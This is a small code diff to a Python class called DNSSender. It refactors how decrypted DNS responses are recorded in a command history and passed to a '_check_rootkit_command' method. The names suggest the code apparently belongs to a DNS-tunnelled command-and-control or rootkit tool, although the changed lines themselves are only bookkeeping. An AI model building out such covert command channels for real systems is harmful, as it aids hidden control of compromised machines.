@@ -115,9 +115,8 @@ class DNSSender:
         print(f"[DNS] Decrypted received response: {raw_decrypted}")
         
         # Update in BigMama attributes
-        self.owner._command_history.append({"command": message, "stdout": "", "stderr": "", "termination_code": "Undefined"})
         self.owner._check_rootkit_command(raw_decrypted)
-        self.owner._update_command_history(raw_decrypted)
+        self.owner._update_command_history(message, raw_decrypted)
 
         # Return the response
         return raw_decrypted
